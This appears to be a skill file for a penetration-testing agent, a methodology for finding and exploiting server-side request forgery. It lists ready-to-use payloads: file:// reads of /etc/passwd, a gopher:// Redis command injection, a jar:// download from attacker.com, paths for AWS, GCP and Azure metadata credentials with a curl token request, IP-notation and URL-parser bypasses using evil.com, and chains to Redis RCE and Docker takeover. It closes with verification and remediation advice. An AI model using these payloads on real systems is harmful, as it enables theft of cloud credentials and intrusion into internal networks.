---
name: ssrf
description: Detect and exploit Server-Side Request Forgery through URL parameters, webhooks, and PDF generators using scheme abuse, cloud metadata endpoints, IP notation bypasses, DNS rebinding, and out-of-band detection for full internal network and cloud IAM takeover.
---

# Server-Side Request Forgery (SSRF) — Internal Network & Cloud Exploitation

SSRF tricks a server-side application into making HTTP requests to attacker-chosen destinations, exposing internal networks, cloud metadata services, and unauthenticated internal services. This skill covers attack surface discovery, scheme abuse, cloud metadata exploitation, filter bypass, and impact chaining.

## When to use this skill

- A feature accepts a URL and fetches it server-side: webhooks, importers, image/avatar fetchers, link previews, PDF generators, RSS readers.
- SSO/SAML configuration accepts an IdP metadata URL or a discovery endpoint.
- The application runs in a cloud environment (AWS, GCP, Azure) where metadata services hold credentials.
- A WAF blocks direct internal IPs and alternate notations or DNS-based bypasses must be tested.
- Blind SSRF is suspected — no response is returned but an out-of-band callback can confirm the request.

## Methodology

### 1. Attack Surface Enumeration

Enumerate every server-side fetch primitive before testing:

- **URL parameters**: `?url=`, `?src=`, `?dest=`, `?redirect=`, `?target=`, `?feed=`, `?proxy=`
- **Webhook configuration**: outbound POST to a user-supplied endpoint (Slack/Discord integrations, CI/CD callbacks)
- **Document/PDF generators**: HTML-to-PDF converters that fetch external images, CSS, or fonts referenced in the markup
- **Importers**: CSV/JSON/XML importers that resolve linked resources
- **Image fetchers**: avatar upload by URL, OpenGraph/og:image preview generators
- **SSO/SAML metadata URLs**: IdP federation endpoints fetched at login or configuration time
- **File upload by URL**: `?file=http://...` patterns in media pipelines

### 2. Scheme Abuse

Test non-HTTP schemes to reach services beyond the HTTP layer:

```text
file:///etc/passwd
file:///C:/Windows/win.ini
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$5%0d%0apwned%0d%0a
dict://127.0.0.1:11211/stat
ldap://127.0.0.1:389/
jar:http://attacker.com/malicious.jar!/
```

`gopher://` is the highest-impact scheme: it crafts arbitrary TCP payloads, enabling raw Redis command injection (`SET`, `SLAVEOF` for module loading RCE), Memcached writes, and SMTP message injection. `dict://` probes Memcached and DICT servers. `jar://` triggers remote JAR downloads in Java-based fetchers.

### 3. Cloud Metadata Exploitation

#### AWS (IMDSv1 and IMDSv2)

IMDSv1 responds directly to GET requests:

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
```

IMDSv2 requires a token obtained via PUT before any GET succeeds:

```bash
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

The response returns a session token that must accompany every subsequent request as `X-aws-ec2-metadata-token: <token>`. If the SSRF primitive only supports GET, IMDSv2-protected instances are resistant — but misconfigured instances with IMDSv1 still leak `AccessKeyId`, `SecretAccessKey`, and `Token` from the security-credentials path.

#### GCP

GCP metadata requires the `Metadata-Flavor: Google` header (which blocks simple SSRF via GET-only primitives unless header injection is possible):

```text
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
```

#### Azure

Azure exposes two metadata paths:

```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

The identity endpoint returns a bearer token for the managed identity, enabling direct Azure Resource Manager API access.

### 4. Filter Bypass Techniques

When internal IPs are blocked, apply notation and parser confusion:

- **Decimal IP**: `http://2130706433/` = `127.0.0.1`
- **Octal IP**: `http://0177.0.0.1/`
- **Hex IP**: `http://0x7f000001/`
- **Shorthand**: `http://127.1/`, `http://0/`, `http://0.0.0.0/`
- **IPv6 loopback**: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
- **DNS rebinding**: point a domain that resolves to `127.0.0.1` on the second lookup — the resolver cache check passes but the connection targets localhost
- **Redirect chaining**: host a 302 redirect on an attacker-controlled server; the allowlist checks the initial URL, the server follows the redirect to the internal target
- **URL parser confusion**: `http://trusted.com@evil.com/` (userinfo confusion), `http://evil.com#trusted.com` (fragment confusion), `http://trusted.com\@evil.com` (backslash parsing differences between validators and fetchers)

### 5. Response Handling and Differential Analysis

Classify the SSRF primitive by what it returns before choosing a testing strategy:

- **Full response**: the fetcher returns the body — read internal pages directly, extract metadata JSON, and enumerate internal hostnames from response content.
- **Status code only**: differentiate open ports (200/302) from closed ports (connection error mapped to a generic 500) by status code alone.
- **Error message differential**: connection refused, DNS resolution failure, and timeout produce distinct error strings — fingerprint each to map the internal surface.
- **Binary response**: image fetchers that return the fetched image allow exfiltration of internal pages re-encoded as image data.

Test each primitive with a controlled external server first to establish the baseline behavior, then apply the same probe against internal targets and compare the differential.

### 6. Blind SSRF Detection

When responses are not returned to the client, use out-of-band DNS:

```text
http://attacker.oast.pro/probe-1
http://<unique-id>.oast.pro/
```

Burp Collaborator and interactsh generate unique subdomains per probe. A DNS callback confirms the server made the request even without a visible response. Correlate each callback to the specific parameter tested by using a unique subdomain per test case.

### 7. Internal Port Scanning and Impact Chaining

Distinguish response-based from timing-based scanning:

- **Response-based**: if the SSRF returns response bodies or status codes, probe `http://127.0.0.1:PORT/` across common ports and differentiate by response content
- **Timing-based**: if responses are suppressed, measure latency — connection-refused returns instantly, open ports hang or return slowly

High-value internal targets:

```text
http://127.0.0.1:6379    (Redis)
http://127.0.0.1:22      (SSH banner)
http://127.0.0.1:8080    (Tomcat/Jenkins)
http://127.0.0.1:9200    (Elasticsearch)
http://127.0.0.1:11211   (Memcached)
http://127.0.0.1:2375    (Docker API — full container takeover)
http://127.0.0.1:8500    (Consul)
```

Chain to full compromise: Redis via `gopher://` for `SLAVEOF` module loading RCE, Docker API for container escape, Elasticsearch for data exfiltration, and cloud metadata for IAM role assumption and cross-account takeover.

## Tooling

- **Burp Collaborator** — out-of-band DNS/HTTP callback detection for blind SSRF confirmation.
- **interactsh** — open-source alternative to Collaborator for OOB interaction tracking.
- **SSRFmap** — automated SSRF detection and exploitation across multiple parameters.
- **gopherus** — generates crafted `gopher://` payloads for Redis, MySQL, SMTP, and Memcached exploitation.
- **rebind.it / dnsspoof** — DNS rebinding infrastructure for TOCTOU-based filter bypass.
- **ffuf** — internal port and service enumeration through the SSRF primitive.

## Verification & Deliverables

1. Confirm every SSRF with an out-of-band callback (Collaborator/interactsh) or a reproducible response differential.
2. Capture the exact request that triggers the fetch, including the full URL parameter and any headers.
3. Demonstrate impact with a non-destructive proof: internal service banner, metadata API version, or a single internal hostname — never exfiltrate live credentials in the report.
4. Document the bypass technique used (notation, rebinding, redirect, parser confusion) and the WAF/filter behavior observed.
5. Validate remediation by re-testing after allowlist enforcement; confirm the payload no longer resolves to internal targets.

**Deliverables**

- Findings table mapping each SSRF primitive to scheme, bypass technique, internal target reached, and severity.
- PoC scripts (curl commands and redirect-server code) reproducing each finding end-to-end.
- Remediation matrix: strict URL allowlists (scheme + host + port), DNS resolution pinning before connection, IMDSv2 enforcement with hop-limit, network segmentation blocking metadata IP from application subnets, and response sanitization to prevent internal data leakage.
